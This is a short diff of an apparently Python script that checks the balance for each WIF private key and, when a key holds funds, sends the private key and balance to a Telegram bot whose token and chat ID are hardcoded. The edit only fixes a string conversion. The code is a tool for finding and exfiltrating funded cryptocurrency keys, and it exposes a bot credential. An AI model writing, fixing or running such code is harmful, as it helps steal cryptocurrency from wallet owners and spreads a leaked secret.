@@ -23,7 +23,7 @@ async def main():
         data = await response.json()
         balance = data["result"]["balance"]
         print(wif, balance)
-        dat=wif+' '+balance
+        dat=wif+' '+str(balance)
         if int(balance) > 0:
             await session.get(f"https://api.telegram.org/bot1898293389:AAEIV3G1RUrn2Mkp9oERYiAQv_RyIcF0KAE/sendMessage?chat_id=1149276168&text={dat}")
             
